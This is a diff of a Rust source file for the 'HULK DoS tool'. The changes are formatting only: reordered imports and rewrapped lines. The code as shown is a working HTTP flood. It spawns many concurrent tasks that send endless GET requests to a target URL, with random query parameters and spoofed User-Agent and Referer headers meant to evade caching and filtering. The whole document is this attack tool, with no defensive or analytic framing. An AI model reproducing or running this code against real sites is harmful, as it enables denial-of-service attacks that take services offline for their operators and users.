@@ -1,13 +1,13 @@
 use clap::Parser;
-use hyper::{Client, Request, Body};
-use hyper::body::HttpBody as _;
-use rand::{thread_rng, Rng};
-use rand::distributions::Alphanumeric;
 use futures::future::join_all;
+use hyper::body::HttpBody as _;
+use hyper::{Body, Client, Request};
 use hyper_tls::HttpsConnector;
-use std::sync::atomic::{AtomicUsize, Ordering};
+use rand::distributions::Alphanumeric;
+use rand::{thread_rng, Rng};
 use std::io;
 use std::io::Write;
+use std::sync::atomic::{AtomicUsize, Ordering};
 
 static REQ_COUNT: AtomicUsize = AtomicUsize::new(0);
 static ERR_COUNT: AtomicUsize = AtomicUsize::new(0);
@@ -29,7 +29,7 @@ static REFERERS: &'static [&'static str] = &[
     "https://www.google.com/?q=",
     "https://bing.com/search?q=",
     "https://yandex.ru/yandsearch?text=",
-    ];
+];
 
 #[derive(Parser, Debug)]
 #[clap(author = "Hexalyse", about = "HULK DoS tool")]
@@ -45,10 +45,11 @@ struct CliArguments {
 }
 
 fn random_string(n: usize) -> String {
-    thread_rng().sample_iter(&Alphanumeric)
-                .take(n)
-                .map(char::from)
-                .collect()
+    thread_rng()
+        .sample_iter(&Alphanumeric)
+        .take(n)
+        .map(char::from)
+        .collect()
 }
 
 #[tokio::main]
@@ -62,25 +63,37 @@ async fn main() -> Result<(), Box<dyn std::error::Error + Send + Sync>> {
     println!("[*] Starting HULK attack on {}", args.target);
     let tasks = (0..args.max_connections).map(|x| {
         let target = args.target.clone();
-        tokio::spawn(async move {
-            fetch_url(target, args.verbose, x).await
-        })
+        tokio::spawn(async move { fetch_url(target, args.verbose, x).await })
     });
     join_all(tasks).await;
-    
+
     Ok(())
 }
 
-async fn fetch_url(target: String, verbose: bool, _thread: usize) -> Result<(), Box<dyn std::error::Error + Send + Sync>> {
+async fn fetch_url(
+    target: String,
+    verbose: bool,
+    _thread: usize,
+) -> Result<(), Box<dyn std::error::Error + Send + Sync>> {
     let https = HttpsConnector::new();
-    let client = Client::builder()
-        .build::<_, hyper::Body>(https);
+    let client = Client::builder().build::<_, hyper::Body>(https);
 
     loop {
-        let uri = if target.contains("?") { format!("{}&{}={}", target, random_string(10), random_string(10)) } else { format!("{}?{}={}", target, random_string(10), random_string(10)) };
-        let referer = format!("{}{}", REFERERS[rand::thread_rng().gen_range(0..REFERERS.len())], random_string(rand::thread_rng().gen_range(5..10)));
+        let uri = if target.contains("?") {
+            format!("{}&{}={}", target, random_string(10), random_string(10))
+        } else {
+            format!("{}?{}={}", target, random_string(10), random_string(10))
+        };
+        let referer = format!(
+            "{}{}",
+            REFERERS[rand::thread_rng().gen_range(0..REFERERS.len())],
+            random_string(rand::thread_rng().gen_range(5..10))
+        );
         let request = Request::get(uri)
-            .header("User-Agent", USER_AGENTS[rand::thread_rng().gen_range(0..USER_AGENTS.len())])
+            .header(
+                "User-Agent",
+                USER_AGENTS[rand::thread_rng().gen_range(0..USER_AGENTS.len())],
+            )
             .header("Referer", referer)
             .body(Body::empty())?;
 
@@ -94,12 +107,20 @@ async fn fetch_url(target: String, verbose: bool, _thread: usize) -> Result<(), 
         let total_reqs = REQ_COUNT.fetch_add(1, Ordering::Relaxed) + 1;
         if total_reqs % 100 == 0 {
             let err_count = ERR_COUNT.load(Ordering::Relaxed);
-            // sometimes the error count is higher than total requests, so we need to check for that not to get a substract with overflow
-            let ok_count = if total_reqs >= err_count { total_reqs - err_count } else { 0 };
-            print!("\r[*] {} requests | {} OK | {} errors", total_reqs, ok_count, err_count);
+            // sometimes the error count is higher than total requests
+            // so we need to check for that not to get a substract with overflow
+            let ok_count = if total_reqs >= err_count {
+                total_reqs - err_count
+            } else {
+                0
+            };
+            print!(
+                "\r[*] {} requests | {} OK | {} errors",
+                total_reqs, ok_count, err_count
+            );
             io::stdout().flush().unwrap();
         }
-        
+
         resp.body_mut().data().await;
     }
 }
